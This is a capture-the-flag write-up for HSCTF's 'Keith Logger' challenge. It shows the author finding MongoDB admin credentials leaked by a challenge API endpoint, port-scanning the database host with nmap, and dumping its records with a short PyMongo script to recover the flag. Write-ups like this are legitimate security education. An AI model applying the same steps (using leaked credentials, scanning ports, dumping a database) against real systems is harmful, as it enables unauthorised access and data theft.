# Keith Logger
Description
```
Written by: dwang

Keith is up to some evil stuff! Can you figure out what he's doing and find the flag?

Note: nothing is actually saved
```
[extension.crx](extension.crx)

I used this [website](https://robwu.nl/crxviewer/) to view the content of the extension

![Screenshot.png](Screenshot.png)

Nothing interesting in first URL
```
https://keith-logger.web.chal.hsctf.com/api/record?text=fcuk&url=text
Result:
{'text': 'fcuk', 'url': 'text', 'time': '04:41:36.281060'}
```
Second one seems interesting
```
https://keith-logger.web.chal.hsctf.com/api/admin
Result:
didn't have time to implement this page yet. use admin:keithkeithkeith@keith-logger-mongodb.web.chal.hsctf.com:27017 for now
```
Seems we can connect MongoDB from the port 27017 with given username and password (admin:keithkeithkeith)

I tried to nmap it to see whether the port its open:
```
# nmap keith-logger-mongodb.web.chal.hsctf.com -p 27017
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-08 12:45 +08
Nmap scan report for keith-logger-mongodb.web.chal.hsctf.com (35.245.189.169)
Host is up (0.32s latency).
rDNS record for 35.245.189.169: 169.189.245.35.bc.googleusercontent.com

PORT      STATE SERVICE
27017/tcp open  mongod

Nmap done: 1 IP address (1 host up) scanned in 1.33 seconds
```
Yeah! Do a quick google search about how to connect MongoDB

At last, I used PyMongo (Python) because I can't install the Command line tools

```python
from pymongo import MongoClient
client = MongoClient('mongodb://admin:keithkeithkeith@keith-logger-mongodb.web.chal.hsctf.com', 27017)
cursor = client['database']['collection'].find({})
for document in cursor:
	print document
```
## Result
```
{u'url': u'https://keith-logger.web.chal.hsctf.com/', u'text': u'are kitties cool', u'_id': ObjectId('5cf0512d464d9fe1d9915fbd'), u'time': u'21:54:53.925045'}
{u'url': u'https://keith-logger.web.chal.hsctf.com/', u'text': u'because i think they are', u'_id': ObjectId('5cf051a95501f2901a915fbd'), u'time': u'21:56:57.974856'}
{u'url': u'https://keith-logger.web.chal.hsctf.com/', u'text': u'meow! :3', u'_id': ObjectId('5cf051b3464d9fe1d9915fbe'), u'time': u'21:57:07.295378'}
{u'url': u'https://keith-logger.web.chal.hsctf.com/', u'text': u'meow! :3', u'_id': ObjectId('5cf0520b464d9fe1d9915fbf'), u'time': u'21:58:35.030635'}
{u'url': u'https://keith-logger.web.chal.hsctf.com/', u'text': u"if you're looking for the flag", u'_id': ObjectId('5cf05212464d9fe1d9915fc0'), u'time': u'21:58:42.170470'}
{u'url': u'https://keith-logger.web.chal.hsctf.com/', u'text': u"it's hsctf{watch_out_for_keyloggers}", u'_id': ObjectId('5cf0521b5501f2901a915fbe'), u'time': u'21:58:51.359556'}
```

# Flag
> hsctf{watch_out_for_keyloggers}